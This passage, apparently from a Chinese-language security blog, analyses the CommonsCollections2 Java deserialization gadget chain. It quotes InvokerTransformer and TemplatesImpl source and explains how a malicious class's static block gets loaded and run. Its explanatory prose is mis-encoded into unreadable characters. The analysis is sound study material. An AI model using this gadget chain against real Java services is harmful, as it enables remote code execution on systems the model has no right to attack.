</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>iArgs</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Constructor that performs no validation.
</span></span></span><span class=line><span class=cl><span class=cm>     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.
</span></span></span><span class=line><span class=cl><span class=cm>     * 
</span></span></span><span class=line><span class=cl><span class=cm>     * @param methodName  the method to call
</span></span></span><span class=line><span class=cl><span class=cm>     * @param paramTypes  the constructor parameter types, not cloned
</span></span></span><span class=line><span class=cl><span class=cm>     * @param args  the constructor arguments, not cloned
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>InvokerTransformer</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>methodName</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=n>paramTypes</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>iMethodName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>methodName</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>iParamTypes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>paramTypes</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>iArgs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>args</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Transforms the input to result by invoking a method on the input.
</span></span></span><span class=line><span class=cl><span class=cm>     * 
</span></span></span><span class=line><span class=cl><span class=cm>     * @param input  the input object to transform
</span></span></span><span class=line><span class=cl><span class=cm>     * @return the transformed result, null if null input
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>input</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>input</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Class</span><span class=w> </span><span class=n>cls</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>();</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Method</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cls</span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=n>iMethodName</span><span class=p>,</span><span class=w> </span><span class=n>iParamTypes</span><span class=p>);</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>method</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>input</span><span class=p>,</span><span class=w> </span><span class=n>iArgs</span><span class=p>);</span><span class=c1>//3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NoSuchMethodException</span><span class=w> </span><span class=n>ex</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FunctorException</span><span class=p>(</span><span class=s>&#34;InvokerTransformer: The method &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>iMethodName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; on &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; does not exist&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IllegalAccessException</span><span class=w> </span><span class=n>ex</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FunctorException</span><span class=p>(</span><span class=s>&#34;InvokerTransformer: The method &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>iMethodName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; on &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; cannot be accessed&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>InvocationTargetException</span><span class=w> </span><span class=n>ex</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FunctorException</span><span class=p>(</span><span class=s>&#34;InvokerTransformer: The method &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>iMethodName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; on &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; threw an exception&#34;</span><span class=p>,</span><span class=w> </span><span class=n>ex</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å‰æ–‡æåˆ°è¿‡ï¼ŒCommonCollections2çš„æ€è·¯æ˜¯æ„é€ ä¸€ä¸ªæ¶æ„ç±»ï¼Œå¹¶åœ¨è¯¥ç±»ä¸­æ„é€ ä¸€ä¸ªåŒ…å«payloadçš„staticä»£ç å—ï¼Œé‚£ä¹ˆJVMåŠ è½½è¯¥ç±»æ—¶ä¼šæ‰§è¡Œè¿™ä¸ªé™æ€çš„ä»£ç å—ï¼Œä»¥æ­¤è§¦å‘payloadã€‚</p><p>é‚£ä¹ˆæ³¨é‡Š1ã€2ã€3å¤„å°±åº”è¯¥ç›´æ¥æˆ–é—´æ¥å®ç°è¯¥ç±»çš„åŠ è½½ï¼Œæˆ–è€…åˆ›å»ºç±»çš„å®ä¾‹çš„åŠŸèƒ½ã€‚</p><p>åœ¨Expä¸­ï¼Œæ­¤å¤„å…ˆåŠ è½½äº†TemplatesImplç±»ï¼Œåˆ©ç”¨TemplatesImplç±»ä¸­çš„æ–¹æ³•ï¼Œå®ä¾‹åŒ–äº†æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»ã€‚</p><p>æ­¤å¤„ï¼Œinputæ˜¯TemplatesImplç±»çš„ä¸€ä¸ªå®ä¾‹ï¼ŒiMethodNameæ˜¯newTransformerã€‚</p><p>æ¥ä¸‹æ¥åˆ†æå…¶ä¸­åŸç†ã€‚</p><h5 id=templatesimpl>TemplatesImpl</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>_name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=w> </span><span class=n>_bytecodes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=n>_class</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Defines the translet class and auxiliary classes.
</span></span></span><span class=line><span class=cl><span class=cm>     * Returns a reference to the Class object that defines the main class
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>defineTransletClasses</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_bytecodes</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>NO_TRANSLET_CLASS_ERR</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TransletClassLoader</span><span class=w> </span><span class=n>loader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>TransletClassLoader</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>AccessController</span><span class=p>.</span><span class=na>doPrivileged</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>PrivilegedAction</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>run</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransletClassLoader</span><span class=p>(</span><span class=n>ObjectFactory</span><span class=p>.</span><span class=na>findClassLoader</span><span class=p>(),</span><span class=n>_tfactory</span><span class=p>.</span><span class=na>getExternalExtensionsMap</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>classCount</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_bytecodes</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>_class</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[</span><span class=n>classCount</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>classCount</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>_auxClasses</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>classCount</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>loader</span><span class=p>.</span><span class=na>defineClass</span><span class=p>(</span><span class=n>_bytecodes</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>);</span><span class=c1>//3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kd>final</span><span class=w> </span><span class=n>Class</span><span class=w> </span><span class=n>superClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=c1>// Check if this is the main class</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>superClass</span><span class=p>.</span><span class=na>getName</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=n>ABSTRACT_TRANSLET</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>_transletIndex</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>_auxClasses</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>.</span><span class=na>getName</span><span class=p>(),</span><span class=w> </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_transletIndex</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>NO_MAIN_TRANSLET_ERR</span><span class=p>,</span><span class=w> </span><span class=n>_name</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>ClassFormatError</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>TRANSLET_CLASS_ERR</span><span class=p>,</span><span class=w> </span><span class=n>_name</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>LinkageError</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>TRANSLET_OBJECT_ERR</span><span class=p>,</span><span class=w> </span><span class=n>_name</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * This method generates an instance of the translet class that is
</span></span></span><span class=line><span class=cl><span class=cm>     * wrapped inside this Template. The translet instance will later
</span></span></span><span class=line><span class=cl><span class=cm>     * be wrapped inside a Transformer object.
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=n>Translet</span><span class=w> </span><span class=nf>getTransletInstance</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_name</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=c1>//5</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_class</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=n>defineTransletClasses</span><span class=p>();</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// The translet needs to keep a reference to all its auxiliary</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// class to prevent the GC from collecting them</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>AbstractTranslet</span><span class=w> </span><span class=n>translet</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>)</span><span class=w> </span><span class=n>_class</span><span class=o>[</span><span class=n>_transletIndex</span><span class=o>]</span><span class=p>.</span><span class=na>newInstance</span><span class=p>();</span><span class=c1>//4</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>postInitialization</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>setTemplates</span><span class=p>(</span><span class=k>this</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>setOverrideDefaultParser</span><span class=p>(</span><span class=n>_overrideDefaultParser</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>setAllowedProtocols</span><span class=p>(</span><span class=n>_accessExternalStylesheet</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_auxClasses</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>translet</span><span class=p>.</span><span class=na>setAuxiliaryClasses</span><span class=p>(</span><span class=n>_auxClasses</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>translet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>InstantiationException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>TRANSLET_OBJECT_ERR</span><span class=p>,</span><span class=w> </span><span class=n>_name</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IllegalAccessException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>TRANSLET_OBJECT_ERR</span><span class=p>,</span><span class=w> </span><span class=n>_name</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Implements JAXP&#39;s Templates.newTransformer()
</span></span></span><span class=line><span class=cl><span class=cm>     *
</span></span></span><span class=line><span class=cl><span class=cm>     * @throws TransformerConfigurationException
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
